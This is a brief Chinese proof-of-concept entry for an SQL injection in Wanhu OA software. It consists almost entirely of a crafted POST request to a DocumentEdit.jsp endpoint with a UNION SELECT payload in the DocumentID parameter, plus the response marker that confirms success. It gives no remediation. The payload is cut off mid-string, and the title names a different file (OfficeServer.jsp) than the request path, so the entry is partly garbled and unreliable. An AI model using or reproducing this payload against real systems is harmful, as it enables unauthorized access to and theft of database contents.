# 万户OAOfficeServer.jsp存在SQL注入漏洞测二

万户 ｜ SQL注入 ｜ —
- **请求**：`POST /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=11'+UNION+ALL+SELECT+NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHA`
- **响应特征**：-1 qkqpqDHtqkqpq